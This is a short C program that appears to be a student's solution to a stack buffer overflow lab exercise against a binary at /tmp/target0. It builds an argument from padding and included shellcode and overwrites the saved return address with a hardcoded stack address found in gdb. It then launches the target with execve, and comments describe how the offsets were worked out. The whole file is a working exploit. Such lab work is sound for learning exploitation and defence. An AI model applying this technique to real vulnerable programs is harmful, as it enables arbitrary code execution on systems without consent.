#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
	
	char arg1[136]; //get buf hex, get link hex, link - buf + 4 gives you 136
	// do i f in gdb to figure out where link is
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	int target = 0xbefffcc0; //get hex for buf 
	// break at foo and x buf gives hex for buf

	// set arg1 to all a's to be sure there are no zeros. 
	memset(arg1, 'A', 132);
	memcpy(arg1, shellcode, strlen(shellcode));

	*((int *) (arg1 + 132)) = target;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}